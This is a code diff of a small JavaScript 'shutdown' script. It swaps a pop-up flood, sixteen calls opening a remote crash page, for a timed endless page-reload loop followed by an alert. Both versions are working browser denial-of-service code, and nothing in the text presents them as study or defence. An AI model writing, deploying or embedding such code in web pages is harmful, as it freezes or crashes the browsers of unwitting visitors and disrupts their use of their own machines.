@@ -1,20 +1,7 @@
 var shutdown = true
 if(shutdown==true){
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.open("http://www.newdream.net/crash/js2.html")
-window.close()
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+alert("shutdown activated")
 }
